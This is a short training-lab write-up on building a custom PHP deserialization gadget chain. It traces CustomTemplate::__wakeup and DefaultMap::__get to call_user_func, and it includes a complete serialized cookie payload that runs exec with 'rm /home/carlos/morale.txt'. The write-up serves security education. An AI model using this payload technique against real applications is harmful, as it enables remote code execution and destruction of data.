# Lab 09 — Developing a Custom Gadget Chain for PHP

## Objective

Construct a custom PHP gadget chain to achieve remote code execution and delete:

```text
/home/carlos/morale.txt
```

Credentials:

```text
wiener:peter
```

## Source-code analysis

1. Log in.
2. Identify the serialized PHP object in the session cookie.
3. Identify:

```text
/cgi-bin/libs/CustomTemplate.php
```

4. Retrieve the source through the `.php~` backup file.
5. Inspect `CustomTemplate::__wakeup()`.
6. Observe that it creates a `Product` using `default_desc_type` and `desc`.
7. Inspect `DefaultMap::__get()`.
8. Observe that it calls:

```php
call_user_func()
```

using the `callback` attribute.

## Data-flow chain

The required object relationship is:

```text
CustomTemplate
 ├── default_desc_type = "rm /home/carlos/morale.txt"
 └── desc = DefaultMap
                  └── callback = "exec"
```

When the `Product` constructor attempts to obtain `default_desc_type` from the `DefaultMap` object, the missing attribute invokes `__get()`.

That calls `exec()` with the controlled command.

## Serialized object

```text
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

Base64- and URL-encode the object and submit it through the session cookie.

## Learning point

This demonstrates how following attacker-controlled data through several existing methods can turn otherwise ordinary functionality into a high-impact gadget chain.
